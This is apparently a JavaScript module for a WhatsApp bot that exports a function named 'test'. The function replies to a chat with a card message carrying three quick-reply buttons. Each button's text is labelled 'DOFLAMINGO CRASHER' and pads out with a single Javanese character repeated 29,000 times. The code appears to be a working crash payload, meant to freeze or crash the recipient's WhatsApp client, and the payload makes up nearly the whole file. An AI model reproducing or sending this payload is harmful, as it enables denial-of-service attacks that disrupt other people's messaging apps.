async function test(message, sock) {

  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
        text: "Hello",
        footer: "Footer Message",
        cards: [

           {
              image: { url: '1.png' }, // or buffer,
              title: '🌹 𝐋𝐎𝐑𝐃 𝐎𝐁𝐈𝐓𝐎 𝐓𝐄𝐂𝐇 🌹',
              caption: 'Just me Lord Obito Dev ',
              footer: "Love's you",
              buttons: [
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `𝐃𝐎𝐅𝐋𝐀𝐌𝐈𝐍𝐆𝐎 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 1${"ꦾ".repeat(29000)}\n\n`,
                         id: "ID"
                      })
                  },
              ]
           },

        ]
    },
    { quoted : message }
)


}
export default test;
